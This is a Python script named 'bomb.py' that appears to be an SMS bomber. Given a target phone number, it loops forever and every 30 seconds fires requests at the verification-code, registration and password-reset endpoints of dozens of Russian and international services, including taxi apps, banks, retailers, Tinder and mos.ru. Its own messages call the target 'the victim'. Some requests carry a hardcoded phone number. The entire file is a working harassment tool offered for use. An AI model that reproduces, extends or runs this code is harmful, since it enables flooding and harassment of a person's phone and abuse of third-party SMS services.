#!/usr/bin/python3
import requests, random, datetime, sys, time, argparse
from colorama import Fore, Back, Style
class spymer:
	def main(self):
		print('''
╔══╗─╔╗─╔╗╔═══╗
║╔╗║─║║─║║║╔══╝
║╚╝╚╗║╚═╝║║╚══╗
║╔═╗║║╔═╗║║╔══╝
║╚═╝║║║─║║║║	
╚═══╝╚╝─╚╝╚╝	''')
		parser = argparse.ArgumentParser(prog='bomb.py')
		parser.add_argument('phonenum', metavar='bomb.py +79000000000')
		args = parser.parse_args()
		def showstatus(message, type='new'):
			now = datetime.datetime.now().strftime('%H:%M:%S')
			icon = '*'
			if type == 'warn':
				icon = '!'
			else:
				if type == 'new':
					icon == '*'
			message = '[' + icon + '][' + now + ']' + message
			return message
		def wrapsbrace(string, endspace=False):
			if endspace == True:
				return '[' + string + '] '
			return '[' + string + ']'
		def sleep(x):
			try:
				time.sleep(x)
			except KeyboardInterrupt:
				print('\r' + showstatus(wrapsbrace('except', True) + 'Error! KeyBoardInterput!', 'warn'))
				exit()
		_phone = args.phonenum
		if _phone[0] == '+':
			_phone = _phone[1:]
		if _phone[0] == '8':
			_phone = '7'+_phone[1:]
		if _phone[0] == '9':
			_phone = '7'+_phone
		
		_name = ''
		for x in range(12):
			_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
		iteration = 0			
		_phone9 = _phone[1:]
		_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] #+7+(915)350-99-08
		_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10] #915+350-99-08
		_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '+7+(915)350-99-08'
		_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11] # '+7 (915) 350 99 08'
		_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '915) 350-99-08'
		print(showstatus(wrapsbrace('info', True) + ('Телефон: +{}').format(_phone)))
		iteration = 0
		while True:
			_email = _name+f'{iteration}'+'@gmail.com'
			grab = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
			print("Grab - sended!")
			rutaxi = requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
			print("RuTaxi - sended!")
			belka = requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
			print("Belka - sended!")
			tinder = requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
			print("Tinder - sended!")
			vkusvill = requests.post('https://vkusvill.ru/ajax/user_v2/auth/check_phone.php', data={'USER_PHONE': '+7 (915) 350-9908','token': '*','is_retry': 'Y'})
			print("VkusVill - sended!")
			karusel = requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
			#uramobil = requests.post('https://service.uramobil.ru/profile/smstoken', json={{'PhoneNumber': '79153509908', 'Captcha': 'rasd'}}, headers={})
			print("Karusel - sended!")
			taxiseven = requests.post('http://taxiseven.ru/auth/register', data={'phone': _phone}, headers={})
			print("TaxiSeven - sended!")
			dostavista = requests.post('https://dostavista.ru/backend/send-verification-sms', data={'phone': _phone9dostavista}, headers={})
			print("Dostavista - sended!")
			tinkoff = requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
			print("Tinkoff - sended!")
			worki = requests.post('https://api.iconjob.co/api/web/v1/verification_code', json={"phone": _phone}, headers={})
			#wildberries = requests.post('https://security.wildberries.ru/mobile/requestconfirmcode?forAction=RegisterUser', data={"phone": '+'+_phone}, headers={})
			print("Worki - sended!")
			mts = requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
			print("MTC - sended!")
			youla = requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
			print("Youla - sended!")
			youdrive =  requests.post(' http://youdrive.today/login/web/phone', data={'phone': _phone9, 'phone_code':'7'})
			print("YouDrive - sended!")
			pizzahut = requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
			print("PizzaHut - sended!")
			rabota = requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
			print("Rabota - sended!")
			drugvokrug = requests.post('https://drugvokrug.ru/siteActions/processSms.htm', data={'cell': _phone})
			print("DrugVoKrug - sended!")
			rutube = requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
			print("RuTube - sended!")
			wifimetro = requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone})
			print("WifiMetro - sended!")
			arambaa = requests.post('http://www.aramba.ru/core.php', data={'act': 'codeRequest', 'phone': '+'+_phone, 'l': _name, 'p': _name, 'name': _name, 'email': _name + '@gmail.com'})
			print("AramBaa - sended!")
			citilink = requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
			print("Citilink - sended!")
			dozarplati = requests.post('https://online-api.dozarplati.com/rpc', json={"id":'1',"jsonrpc":"2.0","method":"auth.login","params":{"phoneNumber":"79153509908"}})
			print("DoZarplati - sended!")
			fastmoney = requests.post('https://fastmoney.ru/auth/registration', data={'RegistrationForm[username]': '+' + _phone, 'RegistrationForm[password]': '12345', 'RegistrationForm[confirmPassword]': '12345', 'yt0': 'Р РµРіРёСЃС‚СЂР°С†РёСЏ'})
			print("FastMoney - sended!")
			findclone = requests.get(' https://findclone.ru/register?phone=+'+_phone, params={'phone': '+'+_phone})
			print("FindClone - sended!")
			pmsm = requests.post('https://ube.pmsm.org.ru/esb/os-reg/submission', json={'data': {'firstName': _name, 'lastName': '***', 'phone': _phone, 'email': _name+'@gmail.com', 'password': _name, 'passwordConfirm': _name}})
			print("PMSM - sended!")
			smsint = requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
			print("SMSInt - sended!")
			lenta = requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
			#maxidom = requests.get('https://www.maxidom.ru/ajax/doRegister.php?send_code_again=Y&email='+_name+'@gmail.com&phone='+_phoneMaxidom+'&code_type=phone', params={'send_code_again': 'Y', 'phone': _phoneMaxidom, 'email': _name+'@gmail.com', 'code_type': 'phone'})
			#mcdonalds = requests.post('https://mcdonalds.ru/api/auth/code', json={'phone': '+' + _phone})
			print("Lenta - sended!")
			oyorooms = requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
			print("OyORooms - sended!")
			pswallet = requests.get('https://api.pswallet.ru/system/smsCode', params={'mobile': _phone, 'type': '0'})
			print("PSWallet - sended!")
			privetmir = requests.post('https://api-user.privetmir.ru/api/v2/send-code', data={'login': '9153509908','scope': 'register-user reset-password','checkApproves': 'Y','approve1': 'on','approve2': 'on','code': ''})
			print("PrivetMir - sended!")
			mvideo = requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': '+7 915 3509908','g-recaptcha-response': '','recaptcha': 'on'})
			print("MVideo - sended!")
			newnext = requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'РРІР°РЅ', 'lastName': 'РРІР°РЅРѕРІ', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
			print("NewNext - sended!")
			optima = requests.post('https://online.optima.taxi/user/get-code', data={'phone': _phone})

			#s7 = requests.get('https://www.s7.ru/dotCMS/priority/ajaxEnrollment',params={'dispatch': 'shortEnrollmentByPhone', 'mobilePhone.countryCode': '7','mobilePhone.areaCode': _phone[1:4], 'mobilePhone.localNumber': _phone[4:-1]})
			print("Optima - sended!")
			sunlight = requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
			print("SunLight - sended!")
			managevoximplant = requests.post('https://api-ru-manage.voximplant.com/api/AddAccount',data={'region': 'eu', 'account_name': _name, 'language_code': 'en','account_email': _name + '@gmail.com', 'account_password': _name})
			print("ManageVoximplant - sended!")
			managevoximplant = requests.post('https://api-ru-manage.voximplant.com/api/SendActivationCode',data={'phone': _phone, 'account_email': _name + '@gmail.com'})
			print("ManageVoximplant2 - sended!")
			gorzdrav = requests.post('https://gorzdrav.org/login/register/sms/send', data={'phone': _phoneGorzdrav, 'CSRFToken': '*'})	
			print("GorZdrav - sended!")
			loginmos = requests.post('https://login.mos.ru/sps/recovery/start', json={"login":_phone,"attr":""})
			print("LoginMos - sended!")
			alpari = requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
			print("Alpari - sended!")
			finvitro = requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
			print("FinVitro - sended!")
			onlinesbis = requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'РџРѕР»СЊР·РѕРІР°С‚РµР»СЊ.Р—Р°СЏРІРєР°РќР°Р¤РёР·РёРєР°','params':{'phone':_phone},'id':'1'})
			print("OnlineBis - sended!")
			psbank = requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'РРІР°РЅ','middleName':'РРІР°РЅРѕРІРёС‡','lastName':'РРІР°РЅРѕРІ','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
			#raiffeisen = requests.get('https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code', params={'number':_phone})
			print("PsBank - sended!")
			beltelecom = requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
			print("Beltelecom - sended!")
			iteration += 1
			print("We stopped bomber for 30 seconds. Wait...")
			print("This is necessary to completely send messages to the victim.")
			time.sleep(30)

spammer = spymer()
spammer.main()
#
